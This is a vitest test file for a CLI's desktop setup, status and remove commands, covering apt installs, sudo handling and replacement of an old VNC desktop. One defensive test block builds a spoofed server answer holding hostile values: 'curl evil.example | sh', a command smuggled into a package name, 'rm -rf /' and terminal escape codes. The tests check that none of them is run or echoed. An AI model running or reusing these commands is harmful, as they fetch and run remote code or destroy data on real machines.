import type { DesktopStatus } from "@codevisor/api"
import { describe, expect, it } from "vitest"

import { fakeMachine, type FakeMachineOptions, UBUNTU } from "../desktop/desktop-test-support.js"
import {
  type DesktopCliDeps,
  desktopRemoveCommand,
  desktopSetupCommand,
  desktopStatusCommand
} from "./desktop.js"
import { type FakeOptions, makeWorld } from "./support-test-support.js"

const url = (path = "") => `http://127.0.0.1:49361/v1/desktop${path}`
const apt = "env DEBIAN_FRONTEND=noninteractive apt-get -o DPkg::Lock::Timeout=600"
const aptUpdate = `${apt} update -q`
const aptInstall = `${apt} install -y -q --no-install-recommends tigervnc-standalone-server tigervnc-common xfce4 xfce4-terminal dbus-x11 xclip python3 fonts-dejavu-core adwaita-icon-theme`
const missing = ["Xvnc", "startxfce4"]
const busy = "Installing packages"
const withAnOldRootDesktop: FakeMachineOptions = {
  files: {
    ...UBUNTU,
    "/etc/systemd/system/vncserver@.service": "[Unit]\nDescription=Codevisor desktop, TigerVNC\n"
  },
  folders: { "/etc/systemd/system/multi-user.target.wants": ["vncserver@1.service"] }
}
const removeTheOldOne = [
  "systemctl disable --now vncserver@1.service",
  "rm -f /etc/systemd/system/vncserver@.service",
  "systemctl daemon-reload"
]

const status = (changes: Partial<DesktopStatus> = {}): DesktopStatus => ({
  state: "none",
  account: "codevisor",
  system: "Ubuntu 24.04.5 LTS",
  missing: [],
  sudo: "passwordless",
  startsAtBoot: true,
  logHint: "journalctl --user -u codevisor-desktop",
  ...changes
})

const answers = (...bodies: unknown[]) => bodies.map((body) => ({ status: 200, body }))
const running = status({ state: "running", display: 1, managed: true })

interface Terminal {
  readonly interactive?: boolean
  readonly agrees?: boolean
  readonly isRoot?: boolean
  readonly sudoFails?: boolean
  readonly machine?: FakeMachineOptions
}

const world = (http: FakeOptions["http"], terminal: Terminal = {}) => {
  const fake = makeWorld({
    http: http ?? {},
    isRoot: terminal.isRoot ?? false,
    ...(terminal.sudoFails === true ? { interactiveExit: 100 } : {})
  })
  const questions: string[] = []
  const deps: DesktopCliDeps = {
    ...fake.deps,
    isInteractive: terminal.interactive ?? true,
    confirm: async (question) => {
      questions.push(question)
      return terminal.agrees ?? true
    },
    system: fakeMachine({ files: UBUNTU, ...terminal.machine }).system
  }
  return { ...fake, deps, questions }
}

describe("codevisor desktop setup", () => {
  it("has the server install and start everything when its account needs no sudo password", async () => {
    const machine = world({
      [`GET ${url()}`]: answers(status({ missing }), status({ missing, busy }), status()),
      [`POST ${url("/packages")}`]: answers(status({ missing, busy })),
      [`POST ${url("/start")}`]: answers(running)
    })
    expect(await desktopSetupCommand(machine.deps)).toBe(0)
    expect(machine.httpCalls(`GET ${url()}`)).toBe(3)
    expect(machine.logs).toEqual([
      "==> Checking this machine",
      "    Ubuntu 24.04.5 LTS, no desktop set up",
      "==> Installing Xfce and TigerVNC (about 640 MB)",
      "==> Starting the desktop as codevisor",
      "==> The desktop is ready. Open it from this machine in Codevisor."
    ])
    expect(machine.interactiveCalls).toEqual([])
    expect(machine.httpCalls(`POST ${url("/packages")}`)).toBe(1)
  })

  it("waits for the server's install, and passes on why it failed", async () => {
    const failure = "Installing packages failed:\nE: Unable to locate package xfce4"
    const machine = world({
      [`GET ${url()}`]: answers(status({ missing }), status({ missing, failure })),
      [`POST ${url("/packages")}`]: answers(status({ missing, busy }))
    })
    expect(await desktopSetupCommand(machine.deps)).toBe(1)
    expect(machine.errors).toEqual([failure])
    expect(machine.httpCalls(`POST ${url("/start")}`)).toBe(0)
  })

  it("keeps waiting through a few unanswered checks during the install", async () => {
    const machine = world({
      [`GET ${url()}`]: [
        ...answers(status({ missing })),
        undefined,
        undefined,
        ...answers(status())
      ],
      [`POST ${url("/packages")}`]: answers(status({ missing, busy })),
      [`POST ${url("/start")}`]: answers(running)
    })
    expect(await desktopSetupCommand(machine.deps)).toBe(0)
    expect(machine.errors).toEqual([])
  })

  it("stops with the server's answer when it stops answering during the install", async () => {
    const machine = world({
      [`GET ${url()}`]: [...answers(status({ missing })), undefined],
      [`POST ${url("/packages")}`]: answers(status({ missing, busy }))
    })
    expect(await desktopSetupCommand(machine.deps)).toBe(1)
    expect(machine.errors).toEqual([
      "Codevisor server is not running on port 49361; start it with: codevisor start"
    ])
  })

  it("says the install is still going on when it outlasts the wait, instead of calling it failed", async () => {
    const machine = world({
      [`GET ${url()}`]: answers(status({ missing }), status({ missing, busy })),
      [`POST ${url("/packages")}`]: answers(status({ missing, busy }))
    })
    expect(await desktopSetupCommand(machine.deps)).toBe(1)
    expect(machine.errors).toEqual([
      "Installing packages is still going on. Run `codevisor desktop setup` again when it is done."
    ])
    expect(machine.httpCalls(`POST ${url("/start")}`)).toBe(0)
  })

  it("runs sudo in the terminal, with its own apt commands, when the account's sudo asks for a password", async () => {
    const machine = world({
      [`GET ${url()}`]: answers(
        status({ missing, sudo: "password" }),
        status({ sudo: "password" })
      ),
      [`POST ${url("/start")}`]: answers(running)
    })
    expect(await desktopSetupCommand(machine.deps)).toBe(0)
    expect(machine.interactiveCalls).toEqual([`sudo ${aptUpdate}`, `sudo ${aptInstall}`])
    expect(machine.httpCalls(`POST ${url("/packages")}`)).toBe(0)
    expect(machine.httpCalls(`POST ${url("/start")}`)).toBe(1)
  })

  it("runs the package manager itself when the command is run by root", async () => {
    const machine = world(
      {
        [`GET ${url()}`]: answers(status({ missing, sudo: "none" }), status({ sudo: "none" })),
        [`POST ${url("/start")}`]: answers(running)
      },
      { isRoot: true }
    )
    expect(await desktopSetupCommand(machine.deps)).toBe(0)
    expect(machine.interactiveCalls).toEqual([aptUpdate, aptInstall])
  })

  it.each([
    { name: "there is no sudo", sudo: "none" as const, interactive: true },
    { name: "sudo asks and nobody is at a terminal", sudo: "password" as const, interactive: false }
  ])("prints the commands for an administrator and starts nothing when $name", async (given) => {
    const machine = world(
      { [`GET ${url()}`]: answers(status({ missing, sudo: given.sudo })) },
      { interactive: given.interactive }
    )
    expect(await desktopSetupCommand(machine.deps)).toBe(1)
    expect(machine.errors).toEqual([
      "Installing packages needs an administrator. Ask one to run:",
      `  ${aptUpdate}`,
      `  ${aptInstall}`,
      "then run `codevisor desktop setup` again."
    ])
    expect(machine.interactiveCalls).toEqual([])
    expect(machine.httpCalls(`POST ${url("/start")}`)).toBe(0)
  })

  it("names what to install on a system whose package manager it doesn't know", async () => {
    const fedora = { "/etc/os-release": 'PRETTY_NAME="Fedora Linux 45"\nID=fedora\n' }
    const machine = world(
      { [`GET ${url()}`]: answers(status({ missing })) },
      { machine: { files: fedora, programs: ["sudo"] } }
    )
    expect(await desktopSetupCommand(machine.deps)).toBe(1)
    expect(machine.logs).toContain("    Fedora Linux 45, no desktop set up")
    expect(machine.errors).toEqual([
      "Codevisor doesn't know how to install packages on this system.",
      "Install these, then run setup again: Xvnc, startxfce4",
      "(TigerVNC 1.12 or newer for Xvnc, Xfce, xclip, dbus and python3.)"
    ])
    expect(machine.httpCalls(`POST ${url("/start")}`)).toBe(0)
  })

  it("stops when the package manager fails in the terminal", async () => {
    const machine = world(
      { [`GET ${url()}`]: answers(status({ missing, sudo: "password" })) },
      { sudoFails: true }
    )
    expect(await desktopSetupCommand(machine.deps)).toBe(1)
    expect(machine.interactiveCalls).toHaveLength(1)
    expect(machine.errors).toEqual(["Installing packages failed."])
  })

  it("skips the install when everything is already there, and says how to start at boot", async () => {
    const machine = world({
      [`GET ${url()}`]: answers(status({ sudo: "none" })),
      [`POST ${url("/start")}`]: answers({ ...running, startsAtBoot: false, startAtBootHint: "x" })
    })
    expect(await desktopSetupCommand(machine.deps)).toBe(0)
    expect(machine.logs.at(-1)).toBe(
      "    It starts at boot once this account lingers: sudo loginctl enable-linger codevisor"
    )
    expect(machine.interactiveCalls).toEqual([])
  })

  it("says a running desktop is already running, and still lets the server make sure", async () => {
    const machine = world({
      [`GET ${url()}`]: answers(running),
      [`POST ${url("/start")}`]: answers(running)
    })
    expect(await desktopSetupCommand(machine.deps)).toBe(0)
    expect(machine.logs).toEqual([
      "==> Checking this machine",
      "    Ubuntu 24.04.5 LTS, a desktop is running",
      "==> The desktop is already running. Open it from this machine in Codevisor."
    ])
    expect(machine.httpCalls(`POST ${url("/start")}`)).toBe(1)
  })

  it("reports the server's reason when the desktop doesn't start", async () => {
    const machine = world({
      [`GET ${url()}`]: answers(status()),
      [`POST ${url("/start")}`]: [
        { status: 500, body: { error: "The desktop didn't start.\nXvnc is missing" } }
      ]
    })
    expect(await desktopSetupCommand(machine.deps)).toBe(1)
    expect(machine.errors).toEqual(["The desktop didn't start.\nXvnc is missing"])
  })

  it("says to start the server when it isn't running", async () => {
    const machine = world({})
    expect(await desktopSetupCommand(machine.deps)).toBe(1)
    expect(machine.errors).toEqual([
      "Codevisor server is not running on port 49361; start it with: codevisor start"
    ])
  })
})

const everythingPrinted = (machine: ReturnType<typeof world>) =>
  [...machine.logs, ...machine.errors, ...machine.interactiveCalls].join("\n")

describe("an answer on the server's port that isn't the server's", () => {
  const escape = String.fromCodePoint(27)
  const hostile = {
    ...status({ sudo: "password" }),
    missing: ["Xvnc", "Xvnc; curl evil.example | sh"],
    account: `root${escape}[2J`,
    system: `Ubuntu${escape}]0;owned`,
    install: [["sh", "-c", "curl evil.example | sh"]],
    packageManager: "sh -c 'curl evil.example | sh'",
    oldDesktop: { units: ["x; reboot"], removal: [["rm", "-rf", "/"]] },
    startsAtBoot: false,
    startAtBootHint: "curl evil.example | sudo sh",
    logHint: `journalctl${escape}[31m`
  }

  it("can make an administrator's setup run only the commands the command builds itself", async () => {
    const machine = world({
      [`GET ${url()}`]: answers(hostile, { ...hostile, missing: [] }),
      [`POST ${url("/start")}`]: answers({ ...hostile, state: "running", managed: true })
    })
    expect(await desktopSetupCommand(machine.deps)).toBe(0)
    expect(machine.interactiveCalls).toEqual([`sudo ${aptUpdate}`, `sudo ${aptInstall}`])
    expect(everythingPrinted(machine)).not.toContain("evil.example")
    expect(everythingPrinted(machine)).not.toContain(escape)
    expect(machine.logs.at(-1)).toBe(
      "    It starts at boot once this account lingers: sudo loginctl enable-linger <the server's account>"
    )
  })

  it("can't make root remove anything: an old desktop is only what the machine's own files show", async () => {
    const asRoot = world(
      {
        [`GET ${url()}`]: answers({ ...hostile, missing: [] }),
        [`POST ${url("/start")}`]: answers(running)
      },
      { isRoot: true }
    )
    expect(await desktopSetupCommand(asRoot.deps, { yes: true })).toBe(0)
    expect(asRoot.interactiveCalls).toEqual([])
    expect(asRoot.questions).toEqual([])
  })

  it("can't put its own text in what status prints", async () => {
    const machine = world({ [`GET ${url()}`]: answers({ ...hostile, state: "running" }) })
    expect(await desktopStatusCommand(machine.deps)).toBe(0)
    expect(machine.logs).toEqual([
      "The desktop is running as the server's account.",
      "It starts at boot once this account lingers: sudo loginctl enable-linger <the server's account>",
      "Log: journalctl[31m"
    ])
  })
})

describe("an older desktop that runs as root", () => {
  const question =
    "An older desktop runs as root on this machine. Replace it? Everything open in it will close."
  const found = { machine: withAnOldRootDesktop }

  it("is replaced after asking once, then the new desktop starts", async () => {
    const machine = world(
      {
        [`GET ${url()}`]: answers(status()),
        [`POST ${url("/replace-old")}`]: answers(status()),
        [`POST ${url("/start")}`]: answers(running)
      },
      found
    )
    expect(await desktopSetupCommand(machine.deps)).toBe(0)
    expect(machine.questions).toEqual([question])
    expect(machine.httpCalls(`POST ${url("/replace-old")}`)).toBe(1)
    expect(machine.logs).toContain("==> Removing the older desktop")
  })

  it("is left alone, with nothing else changed, when the answer is no", async () => {
    const machine = world({ [`GET ${url()}`]: answers(status()) }, { ...found, agrees: false })
    expect(await desktopSetupCommand(machine.deps)).toBe(1)
    expect(machine.httpCalls(`POST ${url("/replace-old")}`)).toBe(0)
    expect(machine.httpCalls(`POST ${url("/start")}`)).toBe(0)
  })

  it("is not replaced unasked where there is no terminal, unless --yes was given", async () => {
    const http = {
      [`GET ${url()}`]: answers(status()),
      [`POST ${url("/replace-old")}`]: answers(status()),
      [`POST ${url("/start")}`]: answers(running)
    }
    const unattended = world(http, { ...found, interactive: false })
    expect(await desktopSetupCommand(unattended.deps)).toBe(1)
    expect(unattended.errors).toEqual([
      question,
      "Run this in a terminal to answer, or pass --yes."
    ])
    expect(unattended.httpCalls(`POST ${url("/replace-old")}`)).toBe(0)

    const agreed = world(http, { ...found, interactive: false })
    expect(await desktopSetupCommand(agreed.deps, { yes: true })).toBe(0)
    expect(agreed.questions).toEqual([])
    expect(agreed.httpCalls(`POST ${url("/replace-old")}`)).toBe(1)
  })

  it("is removed with sudo in the terminal when the account's sudo asks for a password", async () => {
    const machine = world(
      {
        [`GET ${url()}`]: answers(status({ sudo: "password" })),
        [`POST ${url("/start")}`]: answers(running)
      },
      found
    )
    expect(await desktopSetupCommand(machine.deps)).toBe(0)
    expect(machine.interactiveCalls).toEqual(removeTheOldOne.map((command) => `sudo ${command}`))
  })

  it("is named by status", async () => {
    const machine = world({ [`GET ${url()}`]: answers(status({ state: "outdated" })) }, found)
    await desktopStatusCommand(machine.deps)
    expect(machine.logs).toEqual([
      "This machine's desktop was set up for an older version of Codevisor.",
      "Set it up again with: codevisor desktop setup",
      "An older desktop still runs as root (vncserver@1.service). Replace it with: codevisor desktop setup"
    ])
  })
})

describe("a desktop that runs but that Codevisor didn't set up", () => {
  const theirs = status({ state: "running", display: 4, managed: false })
  const question =
    "A desktop that Codevisor didn't set up is shared from this machine. Replace it with a new one? The old one keeps running but is no longer shared."

  it("is replaced only after asking, and the server is told the answer", async () => {
    const machine = world({
      [`GET ${url()}`]: answers(theirs),
      [`POST ${url("/start?replace=1")}`]: answers(running)
    })
    expect(await desktopSetupCommand(machine.deps)).toBe(0)
    expect(machine.questions).toEqual([question])
    expect(machine.logs.slice(-2)).toEqual([
      "==> Starting the desktop as codevisor",
      "==> The desktop is ready. Open it from this machine in Codevisor."
    ])
  })

  it("is left as it is when the answer is no, or when nobody can be asked", async () => {
    const http = {
      [`GET ${url()}`]: answers(theirs),
      [`POST ${url("/start?replace=1")}`]: answers(running)
    }
    for (const terminal of [{ agrees: false }, { interactive: false }]) {
      const machine = world(http, terminal)
      expect(await desktopSetupCommand(machine.deps)).toBe(1)
      expect(machine.httpCalls(`POST ${url("/start?replace=1")}`)).toBe(0)
      expect(machine.httpCalls(`POST ${url("/start")}`)).toBe(0)
    }
  })
})

describe("codevisor desktop status", () => {
  it.each([
    {
      given: status(),
      lines: ["No desktop on this machine. Set one up with: codevisor desktop setup"]
    },
    {
      given: running,
      lines: [
        "The desktop is running as codevisor on display :1.",
        "It starts at boot.",
        "Log: journalctl --user -u codevisor-desktop"
      ]
    },
    {
      given: status({
        state: "stopped",
        display: 2,
        problem: "nothing at /run/user/1001/codevisor-desktop.sock",
        startsAtBoot: false,
        startAtBootHint: "sudo loginctl enable-linger codevisor"
      }),
      lines: [
        "The desktop is set up as codevisor on display :2 but isn't running: nothing at /run/user/1001/codevisor-desktop.sock",
        "It starts at boot once this account lingers: sudo loginctl enable-linger codevisor",
        "Log: journalctl --user -u codevisor-desktop"
      ]
    },
    {
      given: { ...running, startsAtBoot: false, logHint: "/logs/desktop.log" },
      lines: [
        "The desktop is running as codevisor on display :1.",
        "It starts when the Codevisor server starts, not by itself at boot.",
        "Log: /logs/desktop.log"
      ]
    }
  ])("says what is there: $given.state", async ({ given, lines }) => {
    const machine = world({ [`GET ${url()}`]: answers(given) })
    expect(await desktopStatusCommand(machine.deps)).toBe(0)
    expect(machine.logs).toEqual(lines)
  })

  it("passes on the server's answer on a machine that can't have a desktop", async () => {
    const machine = world({
      [`GET ${url()}`]: [
        { status: 501, body: { error: "A desktop can only be set up on a Linux machine" } }
      ]
    })
    expect(await desktopStatusCommand(machine.deps)).toBe(1)
    expect(machine.errors).toEqual(["A desktop can only be set up on a Linux machine"])
  })
})

describe("codevisor desktop remove", () => {
  const question = "Remove the desktop? This closes everything open in it."

  it("asks first, then removes it", async () => {
    const machine = world({ [`DELETE ${url()}`]: answers(status()) })
    expect(await desktopRemoveCommand(machine.deps)).toBe(0)
    expect(machine.questions).toEqual([question])
    expect(machine.logs).toEqual(["The desktop is removed. Its packages stay installed."])
  })

  it("removes nothing when the answer is no", async () => {
    const machine = world({ [`DELETE ${url()}`]: answers(status()) }, { agrees: false })
    expect(await desktopRemoveCommand(machine.deps)).toBe(1)
    expect(machine.httpCalls(`DELETE ${url()}`)).toBe(0)
  })

  it("doesn't ask with --yes", async () => {
    const machine = world({ [`DELETE ${url()}`]: answers(status()) }, { interactive: false })
    expect(await desktopRemoveCommand(machine.deps, { yes: true })).toBe(0)
    expect(machine.questions).toEqual([])
  })
})
